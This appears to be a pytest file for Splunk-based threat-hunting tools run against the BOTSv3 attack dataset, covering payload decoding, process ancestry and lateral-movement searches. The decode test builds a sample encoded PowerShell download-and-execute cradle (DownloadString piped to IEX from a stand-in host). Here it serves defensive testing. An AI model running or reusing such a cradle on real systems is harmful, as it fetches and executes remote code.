"""One live test per tool. Requires local Splunk up with the botsv3 index.

Run: uv run pytest test_tools.py -v -s
Time windows come from ops-narrator-demo-spec-2.md (BOTSv3 attack date 2018-08-20).
"""

import base64

import pytest

import tools

# Time windows in the Splunk SERVER timezone (CST/UTC-6). The spec quotes EDT wall-clock;
# the kill-chain cluster lands ~03:59-04:16 CST, so a wide morning window covers it safely.
MORNING = ("2018-08-20T03:00:00", "2018-08-20T08:00:00")
DAY = ("2018-08-20T00:00:00", "2018-08-20T23:59:59")


def _assert_search_shape(res):
    assert isinstance(res, dict)
    for key in ("rows", "row_count", "spl", "earliest_time", "latest_time"):
        assert key in res, f"missing {key}"
    assert isinstance(res["rows"], list)
    assert res["row_count"] == len(res["rows"])


# 1 ------------------------------------------------------------------------- #
def test_decode_payload():
    script = (
        "$wc = New-Object System.Net.WebClient; "
        "IEX $wc.DownloadString('https://example.test/admin/get.php')"
    )
    enc = base64.b64encode(script.encode("utf-16-le")).decode()
    cmd = f"powershell -noP -sta -w 1 -enc {enc}"

    res = tools.decode_payload(cmd)
    print("\nDECODE:", res["plaintext"][:120], "| indicators:", res["indicators"])

    assert "DownloadString" in res["plaintext"]
    assert res["layers"] >= 1
    assert "https://example.test/admin/get.php" in res["indicators"]["uris"]
    assert "-enc" in res["indicators"]["launcher_flags"]
    assert "IEX" in res["indicators"]["notable_strings"]


# 2 ------------------------------------------------------------------------- #
def test_splunk_search():
    res = tools.splunk_search(f"index={tools.INDEX} | head 5", *DAY)
    _assert_search_shape(res)
    print("\nSPLUNK_SEARCH rows:", res["row_count"])
    assert res["row_count"] >= 1


# 3 ------------------------------------------------------------------------- #
def test_find_process_ancestry():
    res = tools.find_process_ancestry("BSTOLL-L", *MORNING)
    _assert_search_shape(res)
    print("\nANCESTRY rows:", res["row_count"])
    assert res["row_count"] >= 1


# 4 ------------------------------------------------------------------------- #
def test_find_pattern_across_hosts():
    res = tools.find_pattern_across_hosts("*-enc*", *MORNING)
    _assert_search_shape(res)
    hosts = [r.get("host") for r in res["rows"]]
    print("\nSPREAD hosts:", hosts)
    assert res["row_count"] >= 1


# 5 ------------------------------------------------------------------------- #
def test_check_unusual_parents():
    # May legitimately be empty (UAC-bypass path is a known dead end in the data).
    res = tools.check_unusual_parents("BSTOLL-L", *MORNING)
    _assert_search_shape(res)
    print("\nUNUSUAL_PARENTS rows:", res["row_count"])
    assert res["row_count"] >= 0


# 6 ------------------------------------------------------------------------- #
def test_find_lateral_execution():
    res = tools.find_lateral_execution(*MORNING)
    _assert_search_shape(res)
    print("\nLATERAL rows:", res["row_count"], [r.get("host") for r in res["rows"]])
    assert res["row_count"] >= 1


# 7 ------------------------------------------------------------------------- #
def test_trace_account_activity():
    res = tools.trace_account_activity("BudStoll", *DAY)
    _assert_search_shape(res)
    print("\nACCOUNT rows:", res["row_count"])
    assert res["row_count"] >= 1


# 8 ------------------------------------------------------------------------- #
def test_finalize_brief():
    brief = {"headline": "test", "summary": "test summary", "findings": []}
    res = tools.finalize_brief(brief)
    assert res["status"] == "finalized"
    assert res["brief"] == brief
    with pytest.raises(ValueError):
        tools.finalize_brief({"headline": "x"})  # missing required keys
